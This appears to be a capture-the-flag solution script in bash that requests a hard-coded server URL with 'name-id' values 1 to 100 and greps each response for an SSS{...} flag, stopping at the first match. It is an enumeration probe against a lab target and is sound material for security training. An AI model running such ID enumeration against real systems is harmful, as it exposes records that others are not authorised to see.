#!/bin/bash

url='http://141.85.224.70:8088/my-special-name?name-id='
for i in {1..100}
do 
    flag=$(curl -s "$url$i" | grep -o "SSS{.*}")
    if [ ${#flag} -gt 0 ];
        then break;
    fi
done

echo "$flag"
